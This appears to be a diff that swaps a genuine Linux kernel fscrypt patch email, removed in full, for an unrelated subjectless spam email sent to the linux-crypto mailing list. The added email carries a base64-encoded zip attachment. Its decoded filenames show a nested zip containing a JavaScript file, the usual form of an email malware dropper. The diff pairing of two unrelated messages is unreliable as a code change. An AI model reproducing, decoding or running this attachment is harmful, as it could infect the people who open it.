@@ -1,120 +1,105 @@
-From: Eric Biggers <ebiggers3@gmail.com>
-Subject: [PATCH 6/6] fscrypt: for v2 policies, support "fscrypt:" key prefix only
-Date: Wed, 12 Jul 2017 14:00:35 -0700
-Message-ID: <20170712210035.51534-7-ebiggers3@gmail.com>
-References: <20170712210035.51534-1-ebiggers3@gmail.com>
-Cc: linux-fsdevel@vger.kernel.org, linux-ext4@vger.kernel.org,
-        linux-f2fs-devel@lists.sourceforge.net,
-        linux-mtd@lists.infradead.org, linux-crypto@vger.kernel.org,
-        "Theodore Y . Ts'o" <tytso@mit.edu>,
-        Jaegeuk Kim <jaegeuk@kernel.org>,
-        Alex Cope <alexcope@google.com>,
-        Eric Biggers <ebiggers@google.com>
-To: linux-fscrypt@vger.kernel.org
-Return-path: <linux-ext4-owner@vger.kernel.org>
-In-Reply-To: <20170712210035.51534-1-ebiggers3@gmail.com>
-Sender: linux-ext4-owner@vger.kernel.org
-List-Id: linux-crypto.vger.kernel.org
+From: <delaware.orders@nationalcorp.com>
+Subject: (unknown)
+Date: Thu, 13 Jul 2017 04:49:53 -0000
+Message-ID: <149992139373.2511.14184101355580322258@a-tc.net>
+Mime-Version: 1.0
+Content-Type: application/zip; name="EMAIL_649407635104319_linux-crypto.zip
+Content-Transfer-Encoding: base64
+To: <linux-crypto@vger.kernel.org>
+Return-path: <linux-crypto-owner@vger.kernel.org>
+Received: from n230-h91.a-tc.net ([212.107.230.91]:43449 "HELO a-tc.net"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750773AbdGMEt7 (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
+        Thu, 13 Jul 2017 00:49:59 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-crypto-owner@vger.kernel.org
+List-ID: <linux-crypto.vger.kernel.org>
 
-From: Eric Biggers <ebiggers@google.com>
-
-Since v2 encryption policies are opt-in, take the opportunity to also
-drop support for the legacy filesystem-specific key description prefixes
-"ext4:", "f2fs:", and "ubifs:", instead requiring the generic prefix
-"fscrypt:".  The generic prefix is preferred since it works for all
-filesystems.  Also there is a performance benefit from not having to
-search the keyrings twice.
-
-The old prefixes remain supported for v1 encryption policies.
-
-Signed-off-by: Eric Biggers <ebiggers@google.com>
----
- fs/crypto/fscrypt_private.h |  3 +--
- fs/crypto/keyinfo.c         | 16 ++++------------
- fs/crypto/policy.c          |  2 +-
- 3 files changed, 6 insertions(+), 15 deletions(-)
-
-diff --git a/fs/crypto/fscrypt_private.h b/fs/crypto/fscrypt_private.h
-index 4b158717a8c3..201906ff7033 100644
---- a/fs/crypto/fscrypt_private.h
-+++ b/fs/crypto/fscrypt_private.h
-@@ -167,8 +167,7 @@ extern struct page *fscrypt_alloc_bounce_page(struct fscrypt_ctx *ctx,
- 					      gfp_t gfp_flags);
- 
- /* keyinfo.c */
--extern int fscrypt_compute_key_hash(const struct inode *inode,
--				    const struct fscrypt_policy *policy,
-+extern int fscrypt_compute_key_hash(const struct fscrypt_policy *policy,
- 				    u8 hash[FSCRYPT_KEY_HASH_SIZE]);
- extern void __exit fscrypt_essiv_cleanup(void);
- 
-diff --git a/fs/crypto/keyinfo.c b/fs/crypto/keyinfo.c
-index bf60e76f9599..e20b5e85c1b3 100644
---- a/fs/crypto/keyinfo.c
-+++ b/fs/crypto/keyinfo.c
-@@ -385,8 +385,7 @@ find_and_lock_keyring_key(const char *prefix,
- }
- 
- static struct fscrypt_master_key *
--load_master_key_from_keyring(const struct inode *inode,
--			     const u8 descriptor[FS_KEY_DESCRIPTOR_SIZE],
-+load_master_key_from_keyring(const u8 descriptor[FS_KEY_DESCRIPTOR_SIZE],
- 			     unsigned int min_keysize)
- {
- 	struct key *keyring_key;
-@@ -395,11 +394,6 @@ load_master_key_from_keyring(const struct inode *inode,
- 
- 	keyring_key = find_and_lock_keyring_key(FS_KEY_DESC_PREFIX, descriptor,
- 						min_keysize, &payload);
--	if (keyring_key == ERR_PTR(-ENOKEY) && inode->i_sb->s_cop->key_prefix) {
--		keyring_key = find_and_lock_keyring_key(
--					inode->i_sb->s_cop->key_prefix,
--					descriptor, min_keysize, &payload);
--	}
- 	if (IS_ERR(keyring_key))
- 		return ERR_CAST(keyring_key);
- 
-@@ -441,8 +435,7 @@ find_or_create_master_key(const struct inode *inode,
- 	/*
- 	 * The needed master key isn't in memory yet.  Load it from the keyring.
- 	 */
--	master_key = load_master_key_from_keyring(inode,
--						  ctx->master_key_descriptor,
-+	master_key = load_master_key_from_keyring(ctx->master_key_descriptor,
- 						  min_keysize);
- 	if (IS_ERR(master_key))
- 		return master_key;
-@@ -676,8 +669,7 @@ void __exit fscrypt_essiv_cleanup(void)
- 	crypto_free_shash(essiv_hash_tfm);
- }
- 
--int fscrypt_compute_key_hash(const struct inode *inode,
--			     const struct fscrypt_policy *policy,
-+int fscrypt_compute_key_hash(const struct fscrypt_policy *policy,
- 			     u8 hash[FSCRYPT_KEY_HASH_SIZE])
- {
- 	struct fscrypt_master_key *k;
-@@ -691,7 +683,7 @@ int fscrypt_compute_key_hash(const struct inode *inode,
- 		max(available_modes[policy->contents_encryption_mode].keysize,
- 		    available_modes[policy->filenames_encryption_mode].keysize);
- 
--	k = load_master_key_from_keyring(inode, policy->master_key_descriptor,
-+	k = load_master_key_from_keyring(policy->master_key_descriptor,
- 					 min_keysize);
- 	if (IS_ERR(k))
- 		return PTR_ERR(k);
-diff --git a/fs/crypto/policy.c b/fs/crypto/policy.c
-index 7661c66a3533..cd8c9c7cc9a9 100644
---- a/fs/crypto/policy.c
-+++ b/fs/crypto/policy.c
-@@ -117,7 +117,7 @@ int fscrypt_ioctl_set_policy(struct file *filp, const void __user *arg)
- 		pr_warn_once("%s (pid %d) is setting less secure v0 encryption policy; recommend upgrading to v2.\n",
- 			     current->comm, current->pid);
- 	} else {
--		ret = fscrypt_compute_key_hash(inode, &policy, key_hash);
-+		ret = fscrypt_compute_key_hash(&policy, key_hash);
- 		if (ret)
- 			return ret;
- 	}
--- 
-2.13.2.932.g7449e964c-goog
+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
+AAAAAAEAAQBjAAAAvxIAAAAA
